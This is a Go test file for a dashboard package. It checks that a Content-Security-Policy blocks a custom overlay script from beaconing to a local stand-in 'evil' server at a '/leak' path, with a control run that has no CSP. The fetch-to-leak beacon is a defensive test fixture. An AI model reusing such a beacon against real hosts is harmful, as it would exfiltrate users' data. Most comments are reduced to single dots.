//go:build !windows

package dashboard

// .
// .
// .
// .
// .
// .
// .
// .
// .
// .
// .
// .
// .
// .
// .
// .
// .

import (
	"fmt"
	"net/http"
	"net/http/httptest"

	"testing"
)

func TestOverlayCSPBlocksCrossOriginBeacon(t *testing.T) {
	if testing.Short() {
		t.Skip("browser engines are not run in -short")
	}

	// .
	// .
	beaconHit := make(chan string, 4)
	evild := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		select {
		case beaconHit <- "hit:" + r.URL.Path:
		default:
		}
		w.WriteHeader(200)
	}))
	defer evild.Close()

	// .
	// .
	// .
	// .
	overlayModule := fmt.Sprintf(`
export async function attemptBeacon() {
  try {
    const res = await fetch(%q, { mode: 'no-cors' });
    return 'fetched:' + res.type;
  } catch (e) {
    return 'refused:' + (e && e.message ? e.message.slice(0, 60) : String(e));
  }
}
`, evild.URL+"/leak")

	probeModule := `
import { report } from '/__harness.js';
import { attemptBeacon } from '/custom.js';
const out = await attemptBeacon();
if (out.startsWith('refused:')) {
  report('OK');
} else {
  report('FAIL beacon-was-not-refused: ' + out);
}
`

	verdictPage := `<!doctype html><html><head><meta charset="utf-8"></head><body>
<script type="module" src="/probe.js"></script>
</body></html>`

	controlPage := `<!doctype html><html><head><meta charset="utf-8"></head><body>
<script type="module" src="/probe-allow.js"></script>
</body></html>`

	probeAllowModule := `
import { report } from '/__harness.js';
import { attemptBeacon } from '/custom.js';
const out = await attemptBeacon();
if (out.startsWith('fetched:')) {
  report('OK');
} else {
  report('FAIL beacon-was-refused-without-CSP: ' + out);
}
`

	modules := map[string][]byte{
		"/custom.js":      []byte(overlayModule),
		"/probe.js":       []byte(probeModule),
		"/probe-allow.js": []byte(probeAllowModule),
	}

	// .
	t.Run("under-uiCSP-beacon-refused", func(t *testing.T) {
		runPageInEnginesWithHeaders(t, verdictPage, modules,
			map[string]string{"Content-Security-Policy": uiCSP})
	})

	// .
	// .
	// .
	// .
	// .
	// .
	for {
		select {
		case hit := <-beaconHit:
			t.Errorf("evil origin recorded a beacon despite uiCSP: %s", hit)
		default:
			goto half2
		}
	}

half2:
	// .
	// .
	// .
	t.Run("no-CSP-beacon-succeeds", func(t *testing.T) {
		runPageInEnginesWithHeaders(t, controlPage, modules, nil)
	})
}
